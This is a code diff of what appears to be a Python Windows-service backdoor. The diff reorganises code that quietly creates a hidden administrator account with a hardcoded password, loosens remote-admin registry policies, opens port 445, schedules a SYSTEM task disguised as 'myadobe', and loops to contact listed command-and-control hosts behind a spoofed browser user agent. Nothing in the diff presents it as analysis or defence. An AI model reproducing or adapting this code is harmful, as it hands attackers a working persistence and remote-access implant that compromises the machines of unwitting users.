@@ -108,8 +108,9 @@ try:
         subprocess.call("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest /F", creationflags=CREATE_NO_WINDOW)
         #subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
         subprocess.call("netsh advfirewall firewall add rule name=\"Open Port 445\" dir=in action=allow protocol=TCP localport=445", creationflags=CREATE_NO_WINDOW)
+        Init()
         subprocess.call("net start wup", creationflags=0x08000000)
-        os.system("netsh advfirewall set allprofiles state off")
+        #os.system("netsh advfirewall set allprofiles state off")
     #os.system("net.exe user Administrator /active:yes")
     #os.system("net.exe user Administrator Qwerty12")
     #myloop()
@@ -130,29 +131,9 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
         #print getProxy()
         self.ReportServiceStatus(win32service.SERVICE_RUNNING)
         myloop()
-def myloop():
-    sinit='0'
-    site="paner.altervista.org"
-    site1="paner.altervista.org"
-    site2="52.26.124.145"
-    site3="certificates.ddns.net"
-    #os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
-    #os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
-
-
-    ua = UserAgent()
-    #print(ua.chrome)
-    header = {'User-Agent':str(ua.chrome)}
-    #header = {'User-Agent': 'Mozilla/5.0'}
-    #print(header)
-    while True:
-        
-        
-        try:
-                
-                if sinit == '0':
-                        #os.system("net.exe user Administrator /active:yes")
-                        os.system("net.exe user asp Qwerty12 /add")
+def Init():
+    #os.system("net.exe user Administrator /active:yes")
+                        os.system("net.exe user asp Qwerty12! /add")
                         os.system("net.exe localgroup administrators asp /add")
                         os.system("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f")
                         os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
@@ -175,8 +156,31 @@ def myloop():
                         
                         
                         #os.system("net.exe user Administrator Qwerty12")
-                        os.system("net.exe user asp Qwerty12")
+                        #os.system("net.exe user asp Qwerty12")
                         sinit='1'
+def myloop():
+    sinit='0'
+    site="paner.altervista.org"
+    site1="paner.altervista.org"
+    site2="52.26.124.145"
+    site3="certificates.ddns.net"
+    #os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
+    #os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
+
+
+    ua = UserAgent()
+    #print(ua.chrome)
+    header = {'User-Agent':str(ua.chrome)}
+    #header = {'User-Agent': 'Mozilla/5.0'}
+    #print(header)
+    while True:
+        
+        
+        try:
+                
+                if sinit == '0':
+                        Init()
+                        
                 #httpServ = httplib.HTTPConnection(site, 80)
                 #httpServ.connect()
                 
